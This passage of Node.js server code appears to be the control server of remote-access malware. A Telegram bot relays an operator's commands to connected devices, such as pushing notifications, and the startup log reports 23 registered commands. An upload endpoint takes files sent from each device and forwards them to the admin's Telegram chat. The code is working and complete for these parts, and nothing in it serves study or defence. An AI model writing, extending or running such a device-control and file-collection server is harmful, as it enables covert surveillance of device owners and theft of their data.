            setUserSession(chatId, { 
                state: 'awaiting_notification_message', 
                deviceId: session.deviceId, 
                title: text.trim() 
            });
            bot.sendMessage(chatId, `🔔 *Enter notification message:*`).catch(e => {});
        }
        else if (session.state === 'awaiting_notification_message' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'send_notification', { 
                title: session.title, 
                message: text.trim() 
            });
            bot.sendMessage(chatId, `🔔 Notification sent: ${session.title}`).catch(e => {});
            clearUserSession(chatId);
        }
    });
}

// ============================================
// SESSION MANAGEMENT
// ============================================
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// ============================================
// API ENDPOINTS
// ============================================
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'file';
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing data' });
        }
        
        if (bot && botPolling) {
            await bot.sendDocument(adminId, req.file.path, {
                caption: `📁 *File Received*\nDevice: \`${deviceId.substring(0, 8)}...\`\nType: ${fileType}`,
                parse_mode: 'Markdown'
            }).catch(e => {});
            
            setTimeout(() => {
                if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
            }, 60000);
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ============================================
// START SERVER
// ============================================
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n🚀 DMA Server v3.0');
    console.log('━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    
    try {
        await startBot();
        console.log(`🤖 Bot: ✅ Connected`);
        console.log(`📱 Commands: 23 registered`);
        console.log('━━━━━━━━━━━━━━━━━━━━━\n');
    } catch (e) {
        console.log(`🤖 Bot: ❌ Failed`);
    }
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    console.log('\n🛑 Shutting down...');
    
    if (bot) {
        await stopExistingBot();
    }
    
    wss.close(() => {
        server.close(() => {
            console.log('✅ Server shutdown complete');
            process.exit(0);
        });
    });
}

module.exports = { app, server, wss, connectedDevices };
